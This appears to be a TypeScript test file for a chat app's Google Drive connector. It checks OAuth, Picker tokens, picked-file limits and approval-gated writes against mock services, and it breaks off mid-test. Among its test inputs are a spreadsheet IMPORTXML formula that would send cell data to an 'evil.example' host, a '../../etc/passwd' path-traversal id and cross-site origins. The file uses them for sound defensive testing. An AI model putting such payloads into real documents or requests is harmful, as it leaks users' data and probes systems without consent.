import { test, after, beforeEach } from "node:test";
import assert from "node:assert/strict";
import { createServer } from "node:http";
import { createHash, randomBytes } from "node:crypto";
import { register } from "node:module";
import type { AddressInfo } from "node:net";

/*
 * Google Drive in chat (see google.ts), through Flash's own routes: Connect (Google's authorize step
 * and the callback, with the scopes Google granted checked), the Picker's token, recording and
 * forgetting picked files, a chat reply with a stand-in Claude, the approval route and removal,
 * against the stand-in Google of scripts/mock-connectors.ts. Nothing here reaches a real service.
 * Connecting, picking, renewing, approving and removing cost nothing.
 */
register("./support/route-hooks.mjs", import.meta.url);

type Block = { type: "text"; text: string } | { type: "tool_use"; id: string; name: string; input: object };
const replies: { blocks: Block[]; stop: string }[] = [];
const sent: { model: string; messages: unknown[] }[] = [];
const claude = createServer((req, res) => {
  let raw = "";
  req.on("data", (c) => (raw += c));
  req.on("end", () => {
    const body = JSON.parse(raw || "{}");
    if (req.url?.includes("count_tokens")) {
      res.writeHead(200, { "content-type": "application/json" });
      return res.end(JSON.stringify({ input_tokens: 3000 }));
    }
    sent.push(body);
    const reply = replies.shift() ?? { blocks: [{ type: "text", text: "done" }], stop: "end_turn" };
    const usage = { input_tokens: 3000, output_tokens: 200 };
    const events: object[] = [{ type: "message_start", message: { id: `msg_${sent.length}`, type: "message", role: "assistant", model: body.model, content: [], stop_reason: null, usage } }];
    reply.blocks.forEach((b, index) => {
      if (b.type === "text") {
        events.push({ type: "content_block_start", index, content_block: { type: "text", text: "" } });
        events.push({ type: "content_block_delta", index, delta: { type: "text_delta", text: b.text } });
      } else {
        events.push({ type: "content_block_start", index, content_block: { ...b, input: {} } });
        events.push({ type: "content_block_delta", index, delta: { type: "input_json_delta", partial_json: JSON.stringify(b.input) } });
      }
      events.push({ type: "content_block_stop", index });
    });
    events.push({ type: "message_delta", delta: { stop_reason: reply.stop }, usage }, { type: "message_stop" });
    res.writeHead(200, { "content-type": "text/event-stream" });
    for (const e of events) res.write(`event: ${(e as { type: string }).type}\ndata: ${JSON.stringify(e)}\n\n`);
    res.end();
  });
});
await new Promise<void>((r) => claude.listen(0, "127.0.0.1", r));

const ORIGIN = "http://flash.test";
process.env.ANTHROPIC_API_KEY = "sk-fake";
process.env.ANTHROPIC_BASE_URL = `http://127.0.0.1:${(claude.address() as AddressInfo).port}`;
process.env.DATABASE_URL = ":memory:";
process.env.CONNECTOR_KEYS = JSON.stringify({ v1: randomBytes(32).toString("base64") });
process.env.FLASH_APP_URL = ORIGIN;
const SECRET = "mock-google-secret";
const API_KEY = "AIzaMockPickerKey000000000000000000000";
process.env.GOOGLE_CONNECT_CLIENT_ID = "mock-google-client.apps.googleusercontent.com";
process.env.GOOGLE_CONNECT_CLIENT_SECRET = SECRET;
process.env.GOOGLE_PICKER_API_KEY = API_KEY;
process.env.GOOGLE_CONNECT_PROJECT_NUMBER = "123456789012";
delete process.env.VERCEL_ENV;
delete process.env.RESEND_API_KEY;

const { startMockConnectors } = await import("../scripts/mock-connectors.ts");
const mock = await startMockConnectors(0);
process.env.FLASH_CONNECT_MOCK = mock.origin;
mock.google.callback = `${ORIGIN}/api/connect/google/callback`;
after(async () => {
  claude.closeAllConnections();
  claude.close();
  await mock.close();
});

const { afterwards } = await import("./support/next-server.mjs");
const { all, one, run: sql } = await import("../src/lib/server/db.ts");
const { chatKit, runApproved, failedText } = await import("../src/lib/server/connections.ts");
const { inputProblem } = await import("../src/lib/engines/connect.ts");
const { GOOGLE_PROBLEMS, googleReady } = await import("../src/lib/server/google.ts");
const { adminStats } = await import("../src/lib/server/admin-stats.ts");
const { translate } = await import("../src/lib/i18n.ts");
const startRoute = await import("../src/app/api/connect/google/start/route.ts");
const callbackRoute = await import("../src/app/api/connect/google/callback/route.ts");
const pickerRoute = await import("../src/app/api/connect/google/picker-token/route.ts");
const filesRoute = await import("../src/app/api/connect/google/files/route.ts");
const mcpStartRoute = await import("../src/app/api/connect/mcp/start/route.ts");
const connectRoute = await import("../src/app/api/connect/route.ts");
const actionRoute = await import("../src/app/api/connect/actions/[id]/route.ts");
const chatRoute = await import("../src/app/api/chat/route.ts");

const DOC = "doc_trip_plan_0001";
const SHEET = "sheet_budget_00001";
const SLIDES = "slides_pitch_00001";
const PDF = "pdf_report_000001";
const TEXT = "text_notes_000001";
const PRIVATE = "doc_private_00001";
const IMAGE = "image_photo_00001";

beforeEach(() => {
  replies.length = 0;
  sent.length = 0;
  mock.reset();
});

/** A user with a session, exactly `credits` credits and a chat (confirmed unless told otherwise). */
async function account(id: string, { credits = 500, verified = true } = {}) {
  const token = `tok_${id}_${randomBytes(6).toString("hex")}`;
  await sql("INSERT INTO users (id, email, name, password_hash, preferences, created_at, last_free_grant, verified_at) VALUES (?, ?, '', 'x', '', 0, 0, ?)", [
    id,
    `${id}@example.com`,
    verified ? 1 : 0,
  ]);
  await sql("INSERT INTO sessions (token_hash, user_id, expires_at) VALUES (?, ?, ?)", [createHash("sha256").update(token).digest("hex"), id, Date.now() + 3600_000]);
  const d = new Date();
  const month = `${d.getUTCFullYear()}-${String(d.getUTCMonth() + 1).padStart(2, "0")}`;
  await sql("INSERT INTO credit_ledger (user_id, amount, reason, ref, created_at) VALUES (?, ?, 'test', ?, 0)", [id, credits, `free:${id}:${month}`]);
  await sql("INSERT INTO projects (id, user_id, name, messages, updated_at) VALUES (?, ?, 'Docs', '[]', 0)", [`proj_${id}`, id]);
  return { id, cookie: `flash_session=${token}`, projectId: `proj_${id}` };
}
type Account = Awaited<ReturnType<typeof account>>;

const balance = async (id: string) => Number((await one<{ b: number }>("SELECT COALESCE(SUM(amount), 0) AS b FROM credit_ledger WHERE user_id = ?", [id]))!.b);
const request = (method: string, path: string, user: Account, body?: object, origin: string | null = ORIGIN) =>
  new Request(`${ORIGIN}${path}`, {
    method,
    headers: { "content-type": "application/json", cookie: user.cookie, ...(origin !== null && { origin }) },
    ...(body && { body: JSON.stringify(body) }),
  });

// Everything a route answered in these tests, to look for tokens in; the Picker's token answers are kept apart (they carry one by design).
const answers: string[] = [];
const pickerAnswers: string[] = [];
async function read(res: Response, into = answers) {
  const text = await res.text();
  into.push(text, JSON.stringify([...res.headers]));
  return text;
}

/** What Flash logs while fn runs. */
const logs: string[] = [];
async function logsOf<T>(fn: () => Promise<T>): Promise<T> {
  const keep = { log: console.log, error: console.error };
  console.log = (...a: unknown[]) => logs.push(a.map(String).join(" "));
  console.error = (...a: unknown[]) => logs.push(a.map(String).join(" "));
  try {
    return await fn();
  } finally {
    Object.assign(console, keep);
  }
}

/** POST /api/connect/google/start: the page to open, or the refusal. */
async function start(user: Account, body: object = {}, origin: string | null = ORIGIN) {
  const res = await logsOf(() => startRoute.POST(request("POST", "/api/connect/google/start", user, body, origin)));
  return { status: res.status, headers: res.headers, body: JSON.parse(await read(res)) as { url?: string; error?: string; code?: string } };
}

/** The browser at the stand-in Google's authorize page: where it sends the browser next. */
async function visit(url: string): Promise<URL> {
  const res = await fetch(url, { redirect: "manual" });
  assert.equal(res.status, 302, `Google's page answered ${res.status}: ${await res.text()}`);
  return new URL(res.headers.get("location")!);
}

/** The browser back at Flash's Google callback, as `user`: how it ended. */
async function callback(user: Account, back: URL | string) {
  const search = typeof back === "string" ? back : back.search;
  const res = await logsOf(() => callbackRoute.GET(new Request(`${ORIGIN}/api/connect/google/callback${search}`, { headers: { cookie: user.cookie } })));
  assert.equal(res.status, 303);
  assert.equal(res.headers.get("referrer-policy"), "no-referrer");
  assert.equal(res.headers.get("cache-control"), "no-store");
  answers.push(JSON.stringify([...res.headers]));
  const location = new URL(res.headers.get("location")!);
  assert.equal(location.origin, ORIGIN);
  return location.searchParams.get("connect");
}

/** Connect Google Drive all the way, as the browser would. */
async function connect(user: Account, body: object = {}) {
  const started = await start(user, body);
  assert.equal(started.status, 200, JSON.stringify(started.body));
  return callback(user, await visit(started.body.url!));
}

const googleRow = (userId: string) => one<Record<string, unknown>>("SELECT * FROM connections WHERE user_id = ? AND provider = 'google-drive'", [userId]);
const filesOf = (connectionId: string) => all<{ file_id: string; name: string; mime: string }>("SELECT file_id, name, mime FROM connection_files WHERE connection_id = ? ORDER BY file_id", [connectionId]);

/** POST /api/connect/google/picker-token. */
async function pickerToken(user: Account, connectionId: string, origin: string | null = ORIGIN) {
  const res = await logsOf(() => pickerRoute.POST(request("POST", "/api/connect/google/picker-token", user, { connectionId }, origin)));
  const text = await read(res, pickerAnswers);
  return { status: res.status, headers: res.headers, body: JSON.parse(text) as { token?: string; apiKey?: string; appId?: string; mock?: string; error?: string; code?: string } };
}

/** The user picks files in Google's Picker (the stand-in's list): Google gives Flash those files. */
async function pickAtGoogle(user: Account, connectionId: string, ids: string[]) {
  const access = await pickerToken(user, connectionId);
  assert.equal(access.status, 200, JSON.stringify(access.body));
  const res = await fetch(`${access.body.mock}/pick`, { method: "POST", headers: { authorization: `Bearer ${access.body.token}`, "content-type": "application/json" }, body: JSON.stringify({ ids }) });
  assert.equal(res.status, 200);
}

/** POST (record picks) or DELETE (forget one) /api/connect/google/files. */
async function files(user: Account, method: "POST" | "DELETE", body: object, origin: string | null = ORIGIN) {
  const res = await logsOf(() => filesRoute[method](request(method, "/api/connect/google/files", user, body, origin)));
  return { status: res.status, headers: res.headers, body: JSON.parse(await read(res)) as { files?: { id: string; name: string; mime: string }[]; added?: number; refused?: number; error?: string; code?: string } };
}

/** Connect, then pick these files in the Picker and record them: the connection's id. */
async function withFiles(user: Account, ids: string[]) {
  assert.equal(await connect(user), "ok");
  const id = (await googleRow(user.id))!.id as string;
  await pickAtGoogle(user, id, ids);
  const kept = await files(user, "POST", { connectionId: id, ids });
  assert.equal(kept.status, 200, JSON.stringify(kept.body));
  assert.equal(kept.body.added, ids.length);
  return id;
}

let n = 0;
const newId = () => `m${Date.now().toString(36)}${n++}`;
type ChatEvent = { type: string; message?: string; items?: unknown[]; credits?: number; action?: Record<string, unknown> & { id: string; inputHash: string; input: Record<string, unknown>; labels?: Record<string, string> } };
/** A chat request as the page sends it, with Google Drive on, read to its end. */
async function chat(who: Account, text: string, connectors: string[]) {
  const replyId = newId();
  const userMessage = { id: newId(), role: "user", content: text };
  const res = await chatRoute.POST(
    request("POST", "/api/chat", who, {
      projectId: who.projectId,
      replyId,
      engine: "text",
      level: "ascend",
      messages: [{ role: "user", content: text }],
      connectors,
      userMessage,
      afterId: null,
    }),
  );
  assert.equal(res.status, 200);
  const body = await read(res);
  await afterwards();
  return body
    .split("\n")
    .filter((l) => l.trim())
    .map((l) => JSON.parse(l) as ChatEvent);
}

/** Approves (or cancels) a card through its route, from Flash's own page unless told otherwise. */
async function answer(user: Account, card: { id: string; inputHash: string }, decision = "approve", origin: string | null = ORIGIN) {
  const res = await actionRoute.POST(request("POST", `/api/connect/actions/${card.id}`, user, { decision, inputHash: card.inputHash }, origin), {
    params: Promise.resolve({ id: card.id }),
  } as never);
  return { status: res.status, body: JSON.parse(await read(res)) as { status?: string; result?: string; error?: string } };
}

test("Connect: Google's authorize step with drive.file only, offline access, PKCE S256 and consent; the account is the email Google confirmed", async () => {
  const user = await account("g-connect");
  const b0 = await balance(user.id);
  const started = await start(user);
  assert.equal(started.status, 200);
  assert.equal(started.headers.get("cache-control"), "no-store");
  const page = new URL(started.body.url!);
  assert.equal(page.origin + page.pathname, `${mock.origin}/google/accounts/o/oauth2/v2/auth`);
  const p = page.searchParams;
  assert.equal(p.get("client_id"), process.env.GOOGLE_CONNECT_CLIENT_ID);
  assert.equal(p.get("redirect_uri"), `${ORIGIN}/api/connect/google/callback`);
  assert.equal(p.get("response_type"), "code");
  assert.equal(p.get("scope"), "openid email https://www.googleapis.com/auth/drive.file");
  assert.equal(p.get("access_type"), "offline");
  assert.equal(p.get("include_granted_scopes"), "true");
  assert.equal(p.get("prompt"), "consent", "the first Connect asks for consent, so Google sends a refresh token");
  assert.equal(p.get("code_challenge_method"), "S256");
  assert.match(p.get("code_challenge") ?? "", /^[\w-]{43}$/);
  assert.ok(p.get("state"));
  assert.ok(!started.body.url!.includes(SECRET), "never the client secret");

  assert.equal(await callback(user, await visit(page.href)), "ok");
  assert.equal(mock.googleLog.codes, 1);
  const row = (await googleRow(user.id))!;
  assert.equal(row.kind, "google");
  assert.equal(row.status, "ok");
  assert.equal(row.resource, "drive-user@example.com");
  assert.match(String(row.scopes), /drive\.file/);
  assert.ok(row.enc_refresh, "a refresh token is kept");
  assert.equal(JSON.parse(String(row.endpoints_json)).sub, mock.google.sub);
  assert.equal(row.account_id, mock.google.sub, "the account its cards are tied to");
  const listed = JSON.parse(await read(await connectRoute.GET(request("GET", "/api/connect", user)))) as {
    google: boolean;
    connections: { provider: string; account: string; files: unknown[]; signIn: boolean; revocable: boolean; tools: { name: string; kind: string }[] }[];
  };
  assert.equal(listed.google, true);
  const c = listed.connections[0];
  assert.deepEqual([c.provider, c.account, c.files, c.signIn, c.revocable], ["google-drive", "drive-user@example.com", [], true, true]);
  assert.deepEqual(
    c.tools.map((t) => `${t.name}:${t.kind}`),
    ["list_files:read", "read_file:read", "create_doc:write", "create_sheet:write", "create_slides:write", "append_rows:write"],
  );
  assert.equal(await balance(user.id), b0, "connecting costs nothing");
  assert.equal(sent.length, 0, "and calls no model");

  // Connecting again: no consent page (Flash holds a refresh token), and the one kept goes on working.
  const again = await start(user);
  assert.equal(new URL(again.body.url!).searchParams.get("prompt"), null);
  assert.equal(await callback(user, await visit(again.body.url!)), "ok");
  assert.equal((await all("SELECT id FROM connections WHERE user_id = ?", [user.id])).length, 1, "still one Google Drive account");
  mock.expireGoogleTokens();
  await sql("UPDATE connections SET expires_at = 1 WHERE id = ?", [row.id as string]);
  const kit = (await chatKit(user.id, [row.id as string]))!;
  const out = await kit.run(kit.tools.find((t) => t.tool === "list_files")!, {});
  await kit.close();
  assert.equal(out.isError, false, out.text);
  assert.equal(mock.googleLog.refreshes, 1);
});

test("a callback without the state of this user's own authorize step trades nothing", async () => {
  const user = await account("g-state");
  const other = await account("g-state-other");
  const started = await start(other);
  const back = await visit(started.body.url!);
  // Another user's code and state, sent to this user's browser: nothing is traded.
  assert.equal(await callback(user, back), "expired");
  assert.equal(await callback(user, "?code=4/0Afake&state=made-up"), "expired");
  assert.equal(await callback(user, "?code=4/0Afake"), "expired");
  assert.equal(mock.googleLog.codes, 0);
  assert.equal(await googleRow(user.id), null);
  // Its owner can still finish it, once.
  assert.equal(await callback(other, back), "ok");
  assert.equal(await callback(other, back), "expired");
  assert.equal(mock.googleLog.codes, 1);
  // Saying no at Google: nothing kept.
  mock.google.deny = true;
  const denied = await start(user);
  assert.equal(await callback(user, await visit(denied.body.url!)), "cancelled");
  assert.equal(await googleRow(user.id), null);
});

test("a partial grant without drive.file: the tokens go back to Google, and the account waits for Reconnect", async () => {
  const user = await account("g-partial");
  mock.google.grantDrive = false;
  assert.equal(await connect(user), "google_scope");
  assert.deepEqual(mock.googleLog.revoked, ["refresh"], "the tokens Google gave were given back");
  assert.deepEqual(mock.googleLive(), { access: 0, refresh: 0 });
  const row = (await googleRow(user.id))!;
  assert.equal(row.status, "needs_reconnect");
  assert.equal(row.enc_access, "");
  assert.equal(row.enc_refresh, "");
  const view = JSON.parse(await read(await connectRoute.GET(request("GET", "/api/connect", user)))) as { connections: { status: string; signIn: boolean; account: string }[] };
  assert.deepEqual([view.connections[0].status, view.connections[0].signIn, view.connections[0].account], ["needs_reconnect", true, "drive-user@example.com"]);
  assert.equal(await chatKit(user.id, [row.id as string]), null, "no chat uses it");
  const picker = await pickerToken(user, row.id as string);
  assert.equal(picker.status, 409);
  assert.equal(picker.body.code, "reconnect");
  assert.equal(picker.body.token, undefined);

  // Reconnect, granting drive.file this time: consent again (Flash holds no refresh token), and it works.
  mock.google.grantDrive = true;
  const again = await start(user, { connectionId: row.id });
  assert.equal(new URL(again.body.url!).searchParams.get("prompt"), "consent");
  assert.equal(await callback(user, await visit(again.body.url!)), "ok");
  const renewed = (await googleRow(user.id))!;
  assert.equal(renewed.id, row.id);
  assert.equal(renewed.status, "ok");
  assert.ok(renewed.enc_refresh);
});

test("the Picker's token: POST only, from Flash's own page, for the user's own account, never cached or logged, renewed first when it is about to run out", async () => {
  const user = await account("g-picker");
  assert.equal(await connect(user), "ok");
  const id = (await googleRow(user.id))!.id as string;
  assert.equal("GET" in pickerRoute, false, "no GET: the token never travels in an address");
  for (const origin of [null, "null", "https://evil.example", "http://flash.test.evil.example"]) {
    const refused = await pickerToken(user, id, origin);
    assert.equal(refused.status, 403, String(origin));
    assert.equal(refused.headers.get("cache-control"), "no-store");
    assert.equal(refused.body.token, undefined);
  }
  // Another content type (a form a cross-site page can send) is refused too.
  const form = await pickerRoute.POST(new Request(`${ORIGIN}/api/connect/google/picker-token`, { method: "POST", headers: { "content-type": "text/plain", cookie: user.cookie, origin: ORIGIN }, body: JSON.stringify({ connectionId: id }) }));
  assert.equal(form.status, 403);
  const signedOut = await pickerRoute.POST(new Request(`${ORIGIN}/api/connect/google/picker-token`, { method: "POST", headers: { "content-type": "application/json", origin: ORIGIN }, body: JSON.stringify({ connectionId: id }) }));
  assert.equal(signedOut.status, 401);
  assert.equal(signedOut.headers.get("cache-control"), "no-store");

  const given = await pickerToken(user, id);
  assert.equal(given.status, 200);
  assert.equal(given.headers.get("cache-control"), "no-store");
  assert.ok(mock.googleTokens().includes(given.body.token!), "the user's own Google token");
  assert.equal(given.body.apiKey, API_KEY);
  assert.equal(given.body.appId, "123456789012");
  assert.equal(given.body.mock, `${mock.origin}/google/picker`);
  assert.ok(logs.some((l) => l.includes(`connector ${id} google-drive picker token`)));
  assert.ok(!logs.join("\n").includes(given.body.token!), "never logged");

  // Another user's account: nothing.
  const stranger = await account("g-picker-stranger");
  assert.equal((await pickerToken(stranger, id)).status, 404);
  // An unconfirmed account: nothing.
  const unconfirmed = await account("g-picker-unconfirmed", { verified: false });
  process.env.FLASH_DEMO_EMAILS = "true";
  try {
    assert.equal((await pickerToken(unconfirmed, id)).status, 403);
  } finally {
    delete process.env.FLASH_DEMO_EMAILS;
  }

  // A token with less than 10 minutes left is renewed before it is handed over.
  await sql("UPDATE connections SET expires_at = ? WHERE id = ?", [Date.now() + 5 * 60_000, id]);
  const renewed = await pickerToken(user, id);
  assert.equal(renewed.status, 200);
  assert.equal(mock.googleLog.refreshes, 1);
  assert.notEqual(renewed.body.token, given.body.token);
  assert.ok(Number((await googleRow(user.id))!.expires_at) > Date.now() + 30 * 60_000);
});

test("picks: each id is checked with Google's files.get and the user's token, and the name and type kept are Google's", async () => {
  const user = await account("g-picks");
  assert.equal(await connect(user), "ok");
  const id = (await googleRow(user.id))!.id as string;
  const b0 = await balance(user.id);

  // Ids the Picker never gave Flash: Google doesn't show them, so none is kept.
  const unpicked = await files(user, "POST", { connectionId: id, ids: [DOC, SHEET] });
  assert.equal(unpicked.status, 200);
  assert.deepEqual([unpicked.body.added, unpicked.body.refused], [0, 2]);
  assert.deepEqual(await filesOf(id), []);

  await pickAtGoogle(user, id, [DOC, SHEET, IMAGE]);
  const before = mock.googleLog.calls.length;
  const kept = await files(user, "POST", { connectionId: id, ids: [DOC, SHEET, IMAGE, "../../etc/passwd"] });
  assert.equal(kept.status, 200);
  assert.deepEqual([kept.body.added, kept.body.refused], [2, 2], "an image isn't a type Flash reads, and a malformed id is never sent");
  const asked = mock.googleLog.calls.slice(before).map((c) => c.path.split("?")[0]);
  assert.deepEqual(asked, [`/google/www/drive/v3/files/${DOC}`, `/google/www/drive/v3/files/${SHEET}`, `/google/www/drive/v3/files/${IMAGE}`]);
  assert.deepEqual(await filesOf(id), [
    { file_id: DOC, name: "Trip plan", mime: "application/vnd.google-apps.document" },
    { file_id: SHEET, name: "Budget", mime: "application/vnd.google-apps.spreadsheet" },
  ]);
  assert.deepEqual(kept.body.files!.map((f) => f.name).sort(), ["Budget", "Trip plan"]);
  const listed = JSON.parse(await read(await connectRoute.GET(request("GET", "/api/connect", user)))) as { connections: { files: { id: string; name: string }[] }[] };
  assert.deepEqual(listed.connections[0].files.map((f) => f.id).sort(), [DOC, SHEET]);

  // Only from Flash's own page; at most 20 at a time; only the user's own account.
  for (const origin of [null, "https://evil.example"]) assert.equal((await files(user, "POST", { connectionId: id, ids: [DOC] }, origin)).status, 403);
  assert.equal((await files(user, "POST", { connectionId: id, ids: [] })).status, 400);
  assert.equal((await files(user, "POST", { connectionId: id, ids: Array.from({ length: 21 }, (_, i) => `file_number_${i}_xx`) })).status, 400);
  const stranger = await account("g-picks-stranger");
  assert.equal((await files(stranger, "POST", { connectionId: id, ids: [DOC] })).status, 404);
  assert.equal((await files(stranger, "DELETE", { connectionId: id, fileId: DOC })).status, 404);

  // Forgetting one: Flash can't open it in chat any more.
  for (const origin of [null, "https://evil.example"]) assert.equal((await files(user, "DELETE", { connectionId: id, fileId: DOC }, origin)).status, 403);
  const forgot = await files(user, "DELETE", { connectionId: id, fileId: DOC });
  assert.equal(forgot.status, 200);
  assert.deepEqual(forgot.body.files!.map((f) => f.id), [SHEET]);
  assert.deepEqual((await filesOf(id)).map((f) => f.file_id), [SHEET]);
  const kit = (await chatKit(user.id, [id]))!;
  const out = await kit.run(kit.tools.find((t) => t.tool === "read_file")!, { file_id: DOC });
  await kit.close();
  assert.deepEqual(out, { text: GOOGLE_PROBLEMS.notPicked, isError: true });
  assert.equal(await balance(user.id), b0, "picking and forgetting cost nothing");
  assert.equal(sent.length, 0);
});

test("only picked files: an id the user didn't pick is refused before any request, even one Google would open", async () => {
  const user = await account("g-unpicked");
  const id = await withFiles(user, [SHEET]);
  // Google would open this one (it was picked at Google), but it isn't among the connection's files.
  await pickAtGoogle(user, id, [PRIVATE]);
  const kit = (await chatKit(user.id, [id]))!;
  const call = (tool: string, input: Record<string, unknown>) => kit.run(kit.tools.find((t) => t.tool === tool)!, input);
  const before = mock.googleLog.calls.length;
  assert.deepEqual(await call("read_file", { file_id: PRIVATE }), { text: GOOGLE_PROBLEMS.notPicked, isError: true });
  assert.deepEqual(await call("read_file", { file_id: "1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms" }), { text: GOOGLE_PROBLEMS.notPicked, isError: true });
  for (const input of [{ file_id: "../files/x" }, { file_id: `${SHEET}?alt=media` }, { file_id: 42 }, {}]) {
    const out = await call("read_file", input);
    assert.equal(out.isError, true);
    assert.match(out.text, /^That input wasn't usable/);
  }
  assert.deepEqual(await call("read_file", { file_id: SHEET, sheet: "Nope'!A1" }), {
    text: `This spreadsheet has no sheet named "Nope'!A1". Its sheets: Costs, Q2.`,
    isError: true,
  });
  assert.ok(
    mock.googleLog.calls.slice(before).every((c) => c.path.includes(SHEET)),
    "the only requests were for the picked Sheet",
  );
  // A write to a file that isn't picked: refused when approved, and nothing written.
  const card = (await kit.propose(kit.tools.find((t) => t.tool === "append_rows")!, { file_id: PRIVATE, rows: [["x"]] }))!;
  await kit.close();
  assert.equal(card.labels, undefined, "no name for a file Flash doesn't know");
  const done = await answer(user, card);
  assert.equal(done.body.status, "failed");
  assert.equal(done.body.result, GOOGLE_PROBLEMS.notPicked);
  assert.equal(mock.googleLog.writes.length, 0);
});

test("reads in chat run by themselves: a Sheet as CSV (its first sheet, or the one named), a Doc, a deck, a PDF and a text file", async () => {
  const user = await account("g-reads");
  const id = await withFiles(user, [DOC, SHEET, SLIDES, PDF, TEXT]);
  const b0 = await balance(user.id);
  replies.push(
    { blocks: [{ type: "tool_use", id: "toolu_1", name: "google-drive__read_file", input: { file_id: SHEET } }], stop: "tool_use" },
    { blocks: [{ type: "text", text: "Hotel costs 120." }], stop: "end_turn" },
  );
  const events = await chat(user, "What does the hotel cost in my budget?", [id]);
  assert.ok(!events.some((e) => e.type === "approve_action"), "a read asks nothing");
  assert.deepEqual(events.find((e) => e.type === "connector_used")?.items, [{ connection: "Google Drive", tool: "Read a file" }]);
  const toolResult = (sent[1].messages as { content: { type: string; content?: string }[] }[])[2].content.find((b) => b.type === "tool_result")!;
  assert.equal(
    (JSON.parse(toolResult.content!) as { text: string }).text,
    'Google Sheet "Budget", sheet "Costs", as CSV. Its sheets: Costs, Q2.\n\nItem,Cost\r\nHotel,120\r\nTrain,45\r\n"Note, with comma",x',
  );
  assert.ok(b0 - (await balance(user.id)) > 0, "a reply that used Google Drive is paid, like any reply");

  const kit = (await chatKit(user.id, [id]))!;
  const call = (tool: string, input: Record<string, unknown>) => kit.run(kit.tools.find((t) => t.tool === tool)!, input);
  const q2 = await call("read_file", { file_id: SHEET, sheet: "Q2" });
  assert.equal(q2.text, 'Google Sheet "Budget", sheet "Q2", as CSV. Its sheets: Costs, Q2.\n\nMonth,Total\nApril,300');
  assert.ok(mock.googleLog.calls.some((c) => c.path.startsWith(`/google/sheets/v4/spreadsheets/${SHEET}/values/'Q2'!1%3A1000`)));
  assert.equal((await call("read_file", { file_id: DOC })).text, 'Google Doc "Trip plan":\n\nDay 1: Oslo\nDay 2: Bergen\n');
  assert.equal((await call("read_file", { file_id: SLIDES })).text, 'Google Slides "Pitch":\n\nFlash AI\nFast answers for everyone\n');
  assert.match((await call("read_file", { file_id: PDF })).text, /^PDF "Report\.pdf" \(1 page\):\n\n--- Page 1 ---\nQuarterly report: revenue grew/);
  assert.equal((await call("read_file", { file_id: TEXT })).text, 'Text file "notes.txt":\n\nRemember the milk.\n');
  assert.ok(mock.googleLog.calls.some((c) => c.path === `/google/www/drive/v3/files/${DOC}/export?mimeType=text%2Fplain`));
  assert.ok(mock.googleLog.calls.some((c) => c.path === `/google/www/drive/v3/files/${SLIDES}/export?mimeType=text%2Fplain`));
  assert.ok(mock.googleLog.calls.some((c) => c.path === `/google/www/drive/v3/files/${SHEET}/export?mimeType=text%2Fcsv`));
  const listed = await call("list_files", {});
  for (const line of [`"Trip plan" (Google Doc), id ${DOC}`, `"Budget" (Google Sheet), id ${SHEET}`, `"Report.pdf" (PDF), id ${PDF}`]) assert.ok(listed.text.includes(line), line);
  assert.deepEqual(await call("read_file", { file_id: DOC, sheet: "Q2" }), { text: "That input wasn't usable: sheet is only for a Google Sheet.", isError: true });
  await kit.close();
  assert.equal(mock.googleLog.writes.length, 0, "reads write nothing");
});

test("writes wait for Approve: the card shows the whole content; approved, each is written exactly once; cancelled, never", async () => {
  const user = await account("g-writes");
  const id = await withFiles(user, [SHEET]);
  replies.push(
    { blocks: [{ type: "tool_use", id: "toolu_1", name: "google-drive__create_doc", input: { title: "Packing list", text: "Passport\nCharger" } }], stop: "tool_use" },
    { blocks: [{ type: "text", text: "The Doc is waiting for your approval." }], stop: "end_turn" },
  );
  const events = await chat(user, "Make me a packing list Doc", [id]);
  const card = events.find((e) => e.type === "approve_action")!.action!;
  assert.deepEqual(card.input, { title: "Packing list", text: "Passport\nCharger" });
  assert.equal(card.title, "Create a Google Doc");
  assert.equal(mock.googleLog.writes.length, 0, "nothing written before Approve");

  const b1 = await balance(user.id);
  assert.equal((await answer(user, card, "approve", null)).status, 403);
  assert.equal((await answer(user, card, "approve", "https://evil.example")).status, 403);
  assert.equal((await answer(user, { ...card, inputHash: "0".repeat(64) })).status, 409);
  assert.equal(mock.googleLog.writes.length, 0);
  const approved = await answer(user, card);
  assert.equal(approved.status, 200);
  assert.equal(approved.body.status, "done", approved.body.result);
  assert.match(approved.body.result!, /^Created the Google Doc "Packing list": https:\/\/docs\.google\.com\/document\/d\/made_doc_\d+\/edit$/);
  assert.deepEqual(
    mock.googleLog.writes.map((w) => w.kind),
    ["doc", "doc-text"],
  );
  assert.deepEqual(mock.googleLog.writes[0].body, { title: "Packing list" });
  assert.deepEqual(mock.googleLog.writes[1].body, { requests: [{ insertText: { location: { index: 1 }, text: "Passport\nCharger" } }] });
  assert.equal((await answer(user, card)).status, 409, "twice is once");
  assert.equal(mock.googleLog.writes.length, 2);
  assert.equal(await balance(user.id), b1, "approving costs nothing");

  // Rows added to a picked Sheet: the card names the file and shows every row; written as plain values, once.
  const kit = (await chatKit(user.id, [id]))!;
  const rows = [["Taxi", 30], ["=IMPORTXML(\"https://evil.example/?q=\"&A1,\"//a\")", "formula stays text"]];
  const append = (await kit.propose(kit.tools.find((t) => t.tool === "append_rows")!, { file_id: SHEET, rows }))!;
  const sheet = (await kit.propose(kit.tools.find((t) => t.tool === "create_sheet")!, { title: "Trip costs", rows: [["Item", "Cost"], ["Hotel", 120]] }))!;
  const slides = (await kit.propose(kit.tools.find((t) => t.tool === "create_slides")!, { title: "Trip", slides: [{ title: "Day 1", body: "Oslo" }, { title: "Day 2", body: "Bergen" }] }))!;
  const never = (await kit.propose(kit.tools.find((t) => t.tool === "create_doc")!, { title: "Never", text: "" }))!;
  await kit.close();
  assert.deepEqual(append.labels, { file_id: "Budget" });
  assert.deepEqual(append.input, { file_id: SHEET, rows });
  assert.equal(mock.googleLog.writes.length, 2);

  assert.equal((await answer(user, never, "cancel")).body.status, "cancelled");
  assert.equal((await answer(user, never)).status, 409);

  const appended = await answer(user, append);
  assert.equal(appended.body.status, "done", appended.body.result);
  assert.match(appended.body.result!, /^Added 2 rows to "Budget" \(Costs!A5:Z6\): https:\/\/docs\.google\.com\/spreadsheets\/d\/sheet_budget_00001\/edit$/);
  const write = mock.googleLog.writes[2];
  assert.equal(write.kind, "append");
  assert.match(write.path, /:append\?valueInputOption=RAW&insertDataOption=INSERT_ROWS$/);
  assert.deepEqual(write.body.values, rows);
  assert.equal((await answer(user, append)).status, 409);

  const made = await answer(user, sheet);
  assert.equal(made.body.status, "done", made.body.result);
  assert.match(made.body.result!, /^Created the Google Sheet "Trip costs" with 2 rows: https:\/\/docs\.google\.com\/spreadsheets\/d\/made_sheet_\d+\/edit$/);
  const deck = await answer(user, slides);
  assert.equal(deck.body.status, "done", deck.body.result);
